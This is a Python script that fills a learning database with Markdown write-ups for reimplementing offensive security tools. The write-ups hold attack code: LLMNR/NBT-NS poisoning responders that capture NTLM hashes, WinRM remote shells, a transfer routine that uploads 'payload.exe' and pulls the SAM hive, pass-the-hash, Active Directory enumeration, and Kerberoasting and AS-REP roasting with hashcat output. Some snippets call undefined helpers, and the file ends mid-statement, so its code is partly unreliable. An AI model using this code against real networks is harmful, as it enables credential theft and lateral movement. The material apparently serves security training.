#!/usr/bin/env python3
"""Fix Reimplement path task details based on actual task titles."""

import sqlite3
from pathlib import Path

DB_PATH = Path(__file__).parent.parent / "data" / "quest-log.db"

# Detailed implementations for specific task types (based on title, not path)
TASK_DETAILS = {
    # ===== NETWORK SCANNING =====
    "tcp connect scan": """## Overview
Implement TCP connect scan - the most reliable scanning method that completes the full 3-way handshake.

### Implementation
```python
import socket
from concurrent.futures import ThreadPoolExecutor

def tcp_connect_scan(host, port, timeout=1):
    \"\"\"Perform TCP connect scan on a single port.\"\"\"
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return port if result == 0 else None
    except:
        return None

def scan_host(host, ports, threads=100):
    \"\"\"Scan multiple ports concurrently.\"\"\"
    open_ports = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(tcp_connect_scan, host, p): p for p in ports}
        for future in futures:
            result = future.result()
            if result:
                open_ports.append(result)
    return sorted(open_ports)

# Usage
open_ports = scan_host("192.168.1.1", range(1, 1025))
print(f"Open ports: {open_ports}")
```

### Key Concepts
- TCP 3-way handshake (SYN, SYN-ACK, ACK)
- Socket timeout handling
- Concurrent scanning with thread pools
- Port state detection (open/closed/filtered)""",

    "syn scan": """## Overview
Implement SYN scan (half-open scan) - faster and stealthier than connect scan, doesn't complete handshake.

### Implementation
```python
from scapy.all import IP, TCP, sr1, conf

conf.verb = 0  # Suppress output

def syn_scan(host, port, timeout=1):
    \"\"\"Perform SYN scan on a single port.\"\"\"
    # Send SYN packet
    syn_pkt = IP(dst=host)/TCP(dport=port, flags='S')
    response = sr1(syn_pkt, timeout=timeout)

    if response is None:
        return 'filtered'  # No response
    elif response.haslayer(TCP):
        if response[TCP].flags == 0x12:  # SYN-ACK
            # Send RST to close (don't complete handshake)
            rst_pkt = IP(dst=host)/TCP(dport=port, flags='R')
            sr1(rst_pkt, timeout=0.5)
            return 'open'
        elif response[TCP].flags == 0x14:  # RST-ACK
            return 'closed'
    return 'filtered'

def scan_range(host, ports):
    \"\"\"Scan port range with SYN scan.\"\"\"
    results = {}
    for port in ports:
        results[port] = syn_scan(host, port)
    return results
```

### Key Concepts
- Raw socket packet crafting with Scapy
- TCP flags (SYN=0x02, ACK=0x10, RST=0x04)
- Half-open scanning technique
- Requires root/admin privileges""",

    "udp scan": """## Overview
Implement UDP scan - slower and less reliable than TCP due to lack of handshake.

### Implementation
```python
from scapy.all import IP, UDP, ICMP, sr1, conf

def udp_scan(host, port, timeout=2):
    \"\"\"Perform UDP scan on a single port.\"\"\"
    # Send empty UDP packet
    udp_pkt = IP(dst=host)/UDP(dport=port)
    response = sr1(udp_pkt, timeout=timeout, verbose=0)

    if response is None:
        return 'open|filtered'  # No response could mean open
    elif response.haslayer(ICMP):
        icmp_type = response[ICMP].type
        icmp_code = response[ICMP].code
        if icmp_type == 3 and icmp_code == 3:
            return 'closed'  # Port unreachable
        elif icmp_type == 3 and icmp_code in [1, 2, 9, 10, 13]:
            return 'filtered'  # Administratively filtered
    elif response.haslayer(UDP):
        return 'open'  # Got UDP response

    return 'open|filtered'

# Common UDP services to probe with specific payloads
UDP_PROBES = {
    53: b'\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',  # DNS
    161: b'\\x30\\x26\\x02\\x01\\x01\\x04\\x06public',  # SNMP
    123: b'\\xe3\\x00\\x04\\xfa\\x00\\x01\\x00\\x00',  # NTP
}
```

### Key Concepts
- UDP is connectionless - no handshake
- ICMP port unreachable indicates closed
- No response doesn't confirm open
- Service-specific probes improve accuracy""",

    "service detection": """## Overview
Implement service/version detection by analyzing banner responses and protocol behavior.

### Implementation
```python
import socket
import re

SERVICE_PROBES = {
    'http': (b'GET / HTTP/1.0\\r\\n\\r\\n', [
        (r'Server: ([^\\r\\n]+)', 'server'),
        (r'HTTP/([\\d.]+)', 'http_version'),
    ]),
    'ssh': (b'', [  # SSH sends banner first
        (r'SSH-([\\d.]+)-(.+)', 'ssh_version'),
    ]),
    'smtp': (b'', [
        (r'220[- ](.+)', 'smtp_banner'),
    ]),
    'ftp': (b'', [
        (r'220[- ](.+)', 'ftp_banner'),
    ]),
}

def grab_banner(host, port, timeout=3):
    \"\"\"Grab service banner from port.\"\"\"
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Try to receive initial banner
        sock.settimeout(2)
        try:
            banner = sock.recv(1024)
        except socket.timeout:
            banner = b''

        # If no banner, send HTTP probe
        if not banner:
            sock.send(b'GET / HTTP/1.0\\r\\n\\r\\n')
            banner = sock.recv(1024)

        sock.close()
        return banner.decode('utf-8', errors='ignore')
    except:
        return None

def detect_service(banner):
    \"\"\"Identify service from banner.\"\"\"
    if banner.startswith('SSH-'):
        return 'ssh', banner.split('-')[1]
    elif 'HTTP/' in banner:
        match = re.search(r'Server: ([^\\r\\n]+)', banner)
        return 'http', match.group(1) if match else 'unknown'
    elif banner.startswith('220'):
        if 'FTP' in banner.upper():
            return 'ftp', banner
        return 'smtp', banner
    return 'unknown', banner[:50]
```

### Key Concepts
- Banner grabbing techniques
- Protocol-specific probes
- Version fingerprinting with regex
- Service signature database""",

    "os detection": """## Overview
Implement OS fingerprinting by analyzing TCP/IP stack behavior and response characteristics.

### Implementation
```python
from scapy.all import IP, TCP, ICMP, sr1, conf

def tcp_fingerprint(host):
    \"\"\"Fingerprint OS using TCP characteristics.\"\"\"
    results = {}

    # Test 1: TCP Window Size
    syn = IP(dst=host)/TCP(dport=80, flags='S')
    resp = sr1(syn, timeout=2, verbose=0)
    if resp and resp.haslayer(TCP):
        results['window_size'] = resp[TCP].window
        results['ttl'] = resp[IP].ttl
        results['df'] = resp[IP].flags.DF

    # Test 2: TCP Options
    syn_opts = IP(dst=host)/TCP(dport=80, flags='S',
                                 options=[('MSS', 1460), ('NOP', None),
                                         ('WScale', 7), ('SAckOK', '')])
    resp = sr1(syn_opts, timeout=2, verbose=0)
    if resp and resp.haslayer(TCP):
        results['tcp_options'] = resp[TCP].options

    return results

OS_SIGNATURES = {
    'linux': {'window_size': (5720, 5840, 29200), 'ttl': (64,), 'df': True},
    'windows': {'window_size': (8192, 65535), 'ttl': (128,), 'df': True},
    'freebsd': {'window_size': (65535,), 'ttl': (64,), 'df': True},
    'cisco': {'window_size': (4128,), 'ttl': (255,), 'df': False},
}

def identify_os(fingerprint):
    \"\"\"Match fingerprint against known signatures.\"\"\"
    for os_name, sig in OS_SIGNATURES.items():
        score = 0
        if fingerprint.get('ttl') in sig['ttl']:
            score += 1
        if fingerprint.get('window_size') in sig['window_size']:
            score += 1
        if fingerprint.get('df') == sig['df']:
            score += 1
        if score >= 2:
            return os_name
    return 'unknown'
```

### Key Concepts
- TCP/IP stack implementation differences
- TTL initial values (64=Linux, 128=Windows, 255=Cisco)
- TCP window size fingerprinting
- TCP options ordering and support""",

    # ===== RESPONDER/POISONING =====
    "llmnr responder": """## Overview
Implement LLMNR (Link-Local Multicast Name Resolution) responder to capture NTLMv2 hashes.

### Implementation
```python
import socket
import struct

LLMNR_PORT = 5355
LLMNR_ADDR = '224.0.0.252'

def create_llmnr_response(query_name, our_ip):
    \"\"\"Create LLMNR response packet.\"\"\"
    # Transaction ID (2 bytes) + Flags (2 bytes)
    response = struct.pack('>HH', 0x0000, 0x8000)  # Response flag
    # Questions=1, Answers=1, Authority=0, Additional=0
    response += struct.pack('>HHHH', 1, 1, 0, 0)
    # Query name (length-prefixed labels)
    for part in query_name.split('.'):
        response += bytes([len(part)]) + part.encode()
    response += b'\\x00'  # Name terminator
    # Type A, Class IN
    response += struct.pack('>HH', 1, 1)
    # Answer section (same name, pointer to question)
    response += b'\\xc0\\x0c'  # Pointer to name at offset 12
    response += struct.pack('>HH', 1, 1)  # Type A, Class IN
    response += struct.pack('>I', 120)  # TTL
    response += struct.pack('>H', 4)  # Data length
    response += socket.inet_aton(our_ip)  # Our IP
    return response

def run_llmnr_responder(our_ip):
    \"\"\"Run LLMNR responder to poison name resolution.\"\"\"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', LLMNR_PORT))

    # Join multicast group
    mreq = struct.pack('4sl', socket.inet_aton(LLMNR_ADDR), socket.INADDR_ANY)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

    print(f"[*] LLMNR Responder started, poisoning to {our_ip}")

    while True:
        data, addr = sock.recvfrom(1024)
        # Parse query name from LLMNR packet
        query_name = parse_llmnr_query(data)
        print(f"[+] LLMNR Query from {addr[0]}: {query_name}")

        # Send poisoned response
        response = create_llmnr_response(query_name, our_ip)
        sock.sendto(response, addr)
```

### Key Concepts
- LLMNR multicast address 224.0.0.252, port 5355
- Name resolution poisoning attack
- DNS-like packet structure
- Forces victim to authenticate to attacker""",

    "nbt-ns responder": """## Overview
Implement NBT-NS (NetBIOS Name Service) responder to capture credentials via name resolution poisoning.

### Implementation
```python
import socket
import struct

NBNS_PORT = 137

def create_nbns_response(transaction_id, query_name, our_ip):
    \"\"\"Create NBT-NS response packet.\"\"\"
    # Header: Transaction ID + Flags (response, authoritative)
    response = struct.pack('>H', transaction_id)
    response += struct.pack('>H', 0x8500)  # Response + Authoritative
    # Questions=0, Answers=1, Authority=0, Additional=0
    response += struct.pack('>HHHH', 0, 1, 0, 0)

    # NetBIOS encoded name (first-level encoding)
    encoded_name = encode_netbios_name(query_name)
    response += bytes([32]) + encoded_name + b'\\x00'

    # Answer: Type NB (0x20), Class IN (0x01)
    response += struct.pack('>HH', 0x0020, 0x0001)
    response += struct.pack('>I', 120)  # TTL
    response += struct.pack('>H', 6)  # Data length
    response += struct.pack('>H', 0x0000)  # Flags (B-node, unique)
    response += socket.inet_aton(our_ip)

    return response

def encode_netbios_name(name):
    \"\"\"Encode name using NetBIOS first-level encoding.\"\"\"
    # Pad to 16 chars, encode each nibble
    name = name.upper().ljust(16, ' ')
    encoded = b''
    for char in name:
        encoded += bytes([ord('A') + (ord(char) >> 4)])
        encoded += bytes([ord('A') + (ord(char) & 0x0F)])
    return encoded

def run_nbns_responder(our_ip):
    \"\"\"Run NBT-NS responder.\"\"\"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', NBNS_PORT))

    print(f"[*] NBT-NS Responder started on port {NBNS_PORT}")

    while True:
        data, addr = sock.recvfrom(1024)
        trans_id, flags = struct.unpack('>HH', data[:4])

        if flags & 0x8000 == 0:  # Query (not response)
            query_name = decode_netbios_name(data[13:45])
            print(f"[+] NBT-NS Query from {addr[0]}: {query_name}")

            response = create_nbns_response(trans_id, query_name, our_ip)
            sock.sendto(response, addr)
```

### Key Concepts
- NetBIOS name encoding (first-level)
- Broadcast/multicast name resolution
- Legacy Windows name resolution
- Often tried when DNS/LLMNR fail""",

    # ===== WINRM/EVIL-WINRM =====
    "winrm protocol": """## Overview
Implement WinRM (Windows Remote Management) protocol for remote PowerShell execution.

### Implementation
```python
import requests
import base64
from xml.etree import ElementTree as ET

class WinRMClient:
    def __init__(self, host, username, password, port=5985):
        self.url = f"http://{host}:{port}/wsman"
        self.auth = (username, password)
        self.shell_id = None

    def create_shell(self):
        \"\"\"Create a remote shell via WS-Management.\"\"\"
        body = '''<?xml version="1.0" encoding="UTF-8"?>
        <env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope"
                      xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                      xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
                      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
            <env:Header>
                <a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
                <a:To>{url}</a:To>
                <w:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
            </env:Header>
            <env:Body>
                <rsp:Shell>
                    <rsp:InputStreams>stdin</rsp:InputStreams>
                    <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
                </rsp:Shell>
            </env:Body>
        </env:Envelope>'''.format(url=self.url)

        headers = {'Content-Type': 'application/soap+xml;charset=UTF-8'}
        resp = requests.post(self.url, data=body, auth=self.auth, headers=headers)

        # Parse shell ID from response
        root = ET.fromstring(resp.content)
        self.shell_id = root.find('.//{http://schemas.microsoft.com/wbem/wsman/1/windows/shell}ShellId').text
        return self.shell_id

    def execute_command(self, command):
        \"\"\"Execute command in remote shell.\"\"\"
        # Send command request
        # Receive output
        # Return decoded result
        pass

# Usage
client = WinRMClient('192.168.1.100', 'admin', 'password')
shell_id = client.create_shell()
output = client.execute_command('whoami')
```

### Key Concepts
- WS-Management SOAP protocol
- HTTP/HTTPS transport (ports 5985/5986)
- NTLM/Kerberos authentication
- Shell session management""",

    "shell interface": """## Overview
Build interactive PowerShell shell interface over WinRM with real-time output streaming.

### Implementation
```python
import sys
import threading
from winrm_client import WinRMClient

class InteractiveShell:
    def __init__(self, client):
        self.client = client
        self.shell_id = None
        self.running = True

    def start(self):
        \"\"\"Start interactive shell session.\"\"\"
        self.shell_id = self.client.create_shell()
        print(f"[*] Shell created: {self.shell_id}")

        # Start output receiver thread
        receiver = threading.Thread(target=self.receive_output)
        receiver.daemon = True
        receiver.start()

        # Main input loop
        while self.running:
            try:
                cmd = input("PS> ")
                if cmd.lower() == 'exit':
                    self.running = False
                    break
                self.client.send_command(self.shell_id, cmd)
            except KeyboardInterrupt:
                self.running = False

        self.client.delete_shell(self.shell_id)

    def receive_output(self):
        \"\"\"Receive and display output in real-time.\"\"\"
        while self.running:
            output = self.client.receive_output(self.shell_id)
            if output:
                # Handle CLIXML error format
                if output.startswith('#< CLIXML'):
                    output = self.parse_clixml(output)
                sys.stdout.write(output)
                sys.stdout.flush()

    def parse_clixml(self, clixml):
        \"\"\"Parse PowerShell CLIXML error format.\"\"\"
        # Extract error message from XML
        import re
        match = re.search(r'<S S="Error">(.+?)</S>', clixml)
        return match.group(1) if match else clixml

# Usage
client = WinRMClient('target', 'user', 'pass')
shell = InteractiveShell(client)
shell.start()
```

### Key Concepts
- Real-time output streaming
- CLIXML error format parsing
- Session management
- Tab completion support""",

    "file transfer": """## Overview
Implement file upload/download over WinRM using Base64 encoding and PowerShell.

### Implementation
```python
import base64
import os

class WinRMFileTransfer:
    def __init__(self, client):
        self.client = client
        self.chunk_size = 1024 * 1024  # 1MB chunks

    def upload(self, local_path, remote_path):
        \"\"\"Upload file to remote system.\"\"\"
        with open(local_path, 'rb') as f:
            content = f.read()

        # Base64 encode
        encoded = base64.b64encode(content).decode()

        # Upload in chunks
        for i in range(0, len(encoded), self.chunk_size):
            chunk = encoded[i:i + self.chunk_size]
            if i == 0:
                # First chunk - create file
                cmd = f'[IO.File]::WriteAllBytes("{remote_path}", [Convert]::FromBase64String("{chunk}"))'
            else:
                # Append subsequent chunks
                cmd = f'Add-Content -Path "{remote_path}" -Value ([Convert]::FromBase64String("{chunk}")) -Encoding Byte'
            self.client.execute(cmd)

        print(f"[+] Uploaded {local_path} -> {remote_path}")

    def download(self, remote_path, local_path):
        \"\"\"Download file from remote system.\"\"\"
        # Read and encode on remote
        cmd = f'[Convert]::ToBase64String([IO.File]::ReadAllBytes("{remote_path}"))'
        encoded = self.client.execute(cmd)

        # Decode and save locally
        content = base64.b64decode(encoded)
        with open(local_path, 'wb') as f:
            f.write(content)

        print(f"[+] Downloaded {remote_path} -> {local_path}")

# Usage
ft = WinRMFileTransfer(client)
ft.upload('/tmp/payload.exe', 'C:\\\\Windows\\\\Temp\\\\payload.exe')
ft.download('C:\\\\Windows\\\\System32\\\\config\\\\SAM', '/tmp/SAM')
```

### Key Concepts
- Base64 encoding for binary transfer
- Chunked transfer for large files
- PowerShell [IO.File] methods
- Handling memory limitations""",

    "pass-the-hash": """## Overview
Implement pass-the-hash authentication over WinRM using NTLM hash instead of plaintext password.

### Implementation
```python
import struct
import hashlib
import hmac
from binascii import hexlify, unhexlify

def create_ntlm_auth(username, domain, nt_hash):
    \"\"\"Create NTLM authentication with hash (no password needed).\"\"\"

    def create_type1_message():
        \"\"\"Create NTLM Type 1 (Negotiate) message.\"\"\"
        signature = b'NTLMSSP\\x00'
        msg_type = struct.pack('<I', 1)
        # Flags: Negotiate NTLM, Request Target, Negotiate Unicode
        flags = struct.pack('<I', 0x00088207)

        return signature + msg_type + flags + b'\\x00' * 16

    def create_type3_message(challenge, nt_hash):
        \"\"\"Create NTLM Type 3 (Auth) using NT hash directly.\"\"\"
        signature = b'NTLMSSP\\x00'
        msg_type = struct.pack('<I', 3)

        # Compute NTLMv2 response from hash (not password)
        nt_hash_bytes = unhexlify(nt_hash)

        # NTLMv2 hash: HMAC-MD5(NT hash, uppercase(username) + domain)
        user_dom = (username.upper() + domain).encode('utf-16le')
        ntlmv2_hash = hmac.new(nt_hash_bytes, user_dom, hashlib.md5).digest()

        # NTLMv2 response: HMAC-MD5(NTLMv2 hash, challenge + blob)
        blob = create_ntlmv2_blob()
        ntlmv2_response = hmac.new(ntlmv2_hash, challenge + blob, hashlib.md5).digest()

        return signature + msg_type + build_type3_fields(ntlmv2_response + blob)

    return NTLMAuth(create_type1_message, create_type3_message)

# Usage with WinRM
client = WinRMClient('target', 'admin', '', domain='CORP')
client.set_auth(create_ntlm_auth('admin', 'CORP', 'aad3b435b51404eeaad3b435b51404ee'))
client.execute('whoami')
```

### Key Concepts
- NTLM hash format (LM:NT, usually aad3b435:hash)
- NTLMv2 response computation
- No plaintext password needed
- Works for lateral movement""",

    # ===== BLOODHOUND =====
    "ldap": """## Overview
Query Active Directory via LDAP to enumerate users, groups, and computers for BloodHound collection.

### Implementation
```python
from ldap3 import Server, Connection, ALL, NTLM

class ADEnumerator:
    def __init__(self, dc_ip, domain, username, password):
        self.server = Server(dc_ip, get_info=ALL)
        self.conn = Connection(
            self.server,
            user=f'{domain}\\\\{username}',
            password=password,
            authentication=NTLM
        )
        self.conn.bind()
        self.base_dn = ','.join([f'DC={x}' for x in domain.split('.')])

    def get_users(self):
        \"\"\"Enumerate all domain users.\"\"\"
        self.conn.search(
            self.base_dn,
            '(&(objectClass=user)(objectCategory=person))',
            attributes=['sAMAccountName', 'memberOf', 'lastLogon',
                       'userAccountControl', 'servicePrincipalName']
        )
        return self.conn.entries

    def get_groups(self):
        \"\"\"Enumerate all domain groups.\"\"\"
        self.conn.search(
            self.base_dn,
            '(objectClass=group)',
            attributes=['sAMAccountName', 'member', 'description']
        )
        return self.conn.entries

    def get_computers(self):
        \"\"\"Enumerate all domain computers.\"\"\"
        self.conn.search(
            self.base_dn,
            '(objectClass=computer)',
            attributes=['dNSHostName', 'operatingSystem', 'lastLogon']
        )
        return self.conn.entries

    def get_admins(self):
        \"\"\"Find Domain Admin members.\"\"\"
        self.conn.search(
            self.base_dn,
            '(&(objectClass=group)(cn=Domain Admins))',
            attributes=['member']
        )
        return self.conn.entries[0].member if self.conn.entries else []

# Usage
enum = ADEnumerator('192.168.1.1', 'corp.local', 'user', 'pass')
users = enum.get_users()
admins = enum.get_admins()
```

### Key Concepts
- LDAP search filters
- Active Directory schema
- Group membership enumeration
- Service Principal Names (SPNs)""",

    "session": """## Overview
Enumerate logged-in users and sessions across domain computers for BloodHound collection.

### Implementation
```python
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, wkst, srvs

def enum_sessions(target, username, password, domain=''):
    \"\"\"Enumerate logged-on users via NetSessionEnum.\"\"\"
    sessions = []

    try:
        smb = SMBConnection(target, target, timeout=5)
        smb.login(username, password, domain)

        # Connect to SRVSVC
        rpctransport = transport.DCERPCTransportFactory(
            f'ncacn_np:{target}[\\\\pipe\\\\srvsvc]')
        rpctransport.set_smb_connection(smb)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)

        # Call NetSessionEnum
        resp = srvs.hNetrSessionEnum(dce, '\\\\\\\\' + target, NULL, 10)

        for session in resp['InfoStruct']['SessionInfo']['Level10']['Buffer']:
            sessions.append({
                'user': session['sesi10_username'],
                'client': session['sesi10_cname'],
                'time': session['sesi10_time']
            })

    except Exception as e:
        pass  # Host may not be accessible

    return sessions

def enum_logged_on(target, username, password, domain=''):
    \"\"\"Enumerate logged-on users via NetWkstaUserEnum.\"\"\"
    users = []

    try:
        smb = SMBConnection(target, target, timeout=5)
        smb.login(username, password, domain)

        rpctransport = transport.DCERPCTransportFactory(
            f'ncacn_np:{target}[\\\\pipe\\\\wkssvc]')
        rpctransport.set_smb_connection(smb)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(wkst.MSRPC_UUID_WKST)

        resp = wkst.hNetrWkstaUserEnum(dce, 1)

        for user in resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']:
            users.append({
                'user': user['wkui1_username'],
                'domain': user['wkui1_logon_domain']
            })

    except Exception as e:
        pass

    return users
```

### Key Concepts
- NetSessionEnum API
- NetWkstaUserEnum API
- Remote session enumeration
- Active session tracking""",

    "acl": """## Overview
Collect and analyze AD object permissions to find attack paths for BloodHound.

### Implementation
```python
from ldap3 import Server, Connection, NTLM, ALL
import struct

class ACLCollector:
    def __init__(self, conn, base_dn):
        self.conn = conn
        self.base_dn = base_dn

    def get_object_acl(self, dn):
        \"\"\"Get ACL for a specific object.\"\"\"
        self.conn.search(
            dn,
            '(objectClass=*)',
            attributes=['nTSecurityDescriptor'],
            search_scope='BASE'
        )

        if self.conn.entries:
            sd = self.conn.entries[0].nTSecurityDescriptor.raw_values[0]
            return self.parse_security_descriptor(sd)
        return None

    def parse_security_descriptor(self, sd_bytes):
        \"\"\"Parse Windows security descriptor.\"\"\"
        # SECURITY_DESCRIPTOR structure
        revision = sd_bytes[0]
        control = struct.unpack('<H', sd_bytes[2:4])[0]

        # Get DACL offset
        dacl_offset = struct.unpack('<I', sd_bytes[16:20])[0]

        if dacl_offset:
            dacl = sd_bytes[dacl_offset:]
            return self.parse_acl(dacl)
        return []

    def parse_acl(self, acl_bytes):
        \"\"\"Parse ACL and extract ACEs.\"\"\"
        aces = []
        revision = acl_bytes[0]
        ace_count = struct.unpack('<H', acl_bytes[4:6])[0]

        offset = 8
        for _ in range(ace_count):
            ace_type = acl_bytes[offset]
            ace_flags = acl_bytes[offset + 1]
            ace_size = struct.unpack('<H', acl_bytes[offset + 2:offset + 4])[0]

            # Parse access mask and SID
            access_mask = struct.unpack('<I', acl_bytes[offset + 4:offset + 8])[0]
            sid = self.parse_sid(acl_bytes[offset + 8:offset + ace_size])

            aces.append({
                'type': ace_type,
                'flags': ace_flags,
                'mask': access_mask,
                'sid': sid
            })

            offset += ace_size

        return aces

# Dangerous permissions to look for
DANGEROUS_RIGHTS = {
    0x00040000: 'WRITE_DACL',
    0x00080000: 'WRITE_OWNER',
    0x000F01FF: 'FULL_CONTROL',
    0x00000100: 'EXTENDED_RIGHT',  # Check GUID for specific right
}
```

### Key Concepts
- Security Descriptor structure
- DACL (Discretionary Access Control List)
- ACE (Access Control Entry) parsing
- Dangerous permissions detection""",

    # ===== KERBEROS =====
    "kerberoast": """## Overview
Implement Kerberoasting attack to request service tickets for offline password cracking.

### Implementation
```python
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import constants

def kerberoast(domain, username, password, dc_ip):
    \"\"\"Perform Kerberoasting attack.\"\"\"
    # Get TGT first
    client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
        client, password, domain, dc_ip=dc_ip)

    # Find SPNs via LDAP
    spns = get_spn_users(dc_ip, domain, username, password)

    tickets = []
    for spn in spns:
        try:
            # Request TGS for each SPN
            serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                serverName, domain, dc_ip, tgt, cipher, sessionKey)

            # Extract ticket for cracking
            ticket_data = extract_ticket_hash(tgs)
            tickets.append({
                'spn': spn,
                'hash': ticket_data
            })
        except Exception as e:
            pass

    return tickets

def output_hashcat(tickets):
    \"\"\"Output tickets in hashcat format.\"\"\"
    for t in tickets:
        # Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23)
        print(f"$krb5tgs$23$*{t['spn'].split('/')[0]}${t['hash']}")

def get_spn_users(dc_ip, domain, username, password):
    \"\"\"Find users with SPNs via LDAP.\"\"\"
    from ldap3 import Server, Connection, NTLM

    server = Server(dc_ip)
    conn = Connection(server, f'{domain}\\\\{username}', password, authentication=NTLM)
    conn.bind()

    base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
    conn.search(base_dn,
               '(&(objectClass=user)(servicePrincipalName=*))',
               attributes=['servicePrincipalName', 'sAMAccountName'])

    spns = []
    for entry in conn.entries:
        for spn in entry.servicePrincipalName:
            spns.append(str(spn))
    return spns
```

### Key Concepts
- Service Principal Names (SPNs)
- TGS-REP ticket extraction
- RC4-HMAC (etype 23) tickets are crackable
- Hashcat mode 13100/19600/19700""",

    "asrep": """## Overview
Implement AS-REP Roasting to attack accounts without Kerberos pre-authentication.

### Implementation
```python
from impacket.krb5.asn1 import AS_REQ, AS_REP, EncASRepPart
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import constants
import socket
import datetime

def asrep_roast(domain, username, dc_ip):
    \"\"\"Request AS-REP without pre-authentication.\"\"\"
    # Build AS-REQ without pre-auth
    client_name = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    server_name = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_SRV_INST.value)

    as_req = AS_REQ()
    as_req['pvno'] = 5
    as_req['msg-type'] = constants.ApplicationTagNumbers.AS_REQ.value

    # Request body
    as_req['req-body']['kdc-options'] = constants.KDCOptions.forwardable.value
    as_req['req-body']['cname'] = client_name
    as_req['req-body']['realm'] = domain.upper()
    as_req['req-body']['sname'] = server_name
    as_req['req-body']['till'] = KerberosTime.to_asn1(
        datetime.datetime.utcnow() + datetime.timedelta(days=1))
    as_req['req-body']['nonce'] = random.getrandbits(32)
    as_req['req-body']['etype'] = [23, 17, 18]  # RC4, AES128, AES256

    # Send to KDC
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((dc_ip, 88))
    sock.send(encode_krb5(as_req))
    response = sock.recv(4096)
    sock.close()

    # Parse AS-REP
    as_rep = decode_krb5(response)

    # Extract encrypted part for cracking
    enc_part = as_rep['enc-part']
    return format_hashcat(username, domain, enc_part)

def format_hashcat(username, domain, enc_part):
    \"\"\"Format for hashcat mode 18200.\"\"\"
    return f"$krb5asrep$23${username}@{domain}:{enc_part['cipher'].hex()}"

def find_no_preauth_users(dc_ip, domain, username, password):
    \"\"\"Find users with 'Do not require Kerberos preauthentication'.\"\"\"
    from ldap3 import Server, Connection, NTLM

    conn = Connection(Server(dc_ip), f'{domain}\\\\{username}',
                     password, authentication=NTLM)
    conn.bind()

    # UAC flag 0x400000 = DONT_REQ_PREAUTH
    conn.search(
        ','.join([f'DC={x}' for x in domain.split('.')]),
        '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
        attributes=['sAMAccountName']
    )

    return [str(e.sAMAccountName) for e in conn.entries]
```

### Key Concepts
- DONT_REQ_PREAUTH UAC flag
- AS-REQ without PA-ENC-TIMESTAMP
- Hashcat mode 18200
- No authentication needed to request""",
}

# Generic template for tasks without specific details
GENERIC_TEMPLATE = """## Overview
{overview}

### Implementation
Follow the structured approach:
1. Understand the underlying protocol/mechanism
2. Study existing implementations for reference
3. Implement core functionality first
4. Add error handling and edge cases
5. Test in isolated environment

### Key Concepts
- Understand the attack/tool methodology
- Handle errors and edge cases gracefully
- Test in controlled lab environment
- Consider operational security
- Document findings and code

### Practice
- [ ] Implement core functionality
- [ ] Add error handling
- [ ] Test against known targets
- [ ] Compare output with original tool
- [ ] Document implementation

### Completion Criteria
- [ ] Tool produces expected results
- [ ] Handles edge cases properly
- [ ] Code is clean and documented
- [ ] Can explain the implementation
"""


def get_task_details(title, description):
    """Get comprehensive details for a task based on its title."""
    title_lower = title.lower()

    # Check for specific task matches
    for key, details in TASK_DETAILS.items():
        if key in title_lower:
            return details + "\n\n### Practice\n- [ ] Implement core functionality\n- [ ] Test thoroughly\n- [ ] Compare with reference implementation\n\n### Completion Criteria\n- [ ] Works as expected\n- [ ] Edge cases handled\n- [ ] Code documented"

    # Generate overview from description or title
    overview = description if description else f"Implement {title} as part of your security tool development skills."

    return GENERIC_TEMPLATE.format(overview=overview)


def main():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    # Get all Reimplement path tasks with light details
    cursor.execute("""
        SELECT t.id, t.title, t.description, p.name as path_name, length(t.details) as len
        FROM tasks t
        JOIN modules m ON t.module_id = m.id
        JOIN paths p ON m.path_id = p.id
        WHERE p.name LIKE 'Reimplement%'
        AND length(t.details) < 1000
        ORDER BY p.name, t.id
    """)

    tasks = [dict(row) for row in cursor.fetchall()]
    print(f"Found {len(tasks)} Reimplement tasks with light details...")

    updated = 0
    for task in tasks:
        new_details = get_task_details(task['title'], task['description'])
        if len(new_details) > task['len']:
            cursor.execute(
                "UPDATE tasks SET details = ? WHERE id = ?",
                (new_details, task["id"])
            )
            updated += 1

    conn.commit()
    conn.close()

    print(f"Done! Enhanced {updated} tasks.")


if __name__ == "__main__":
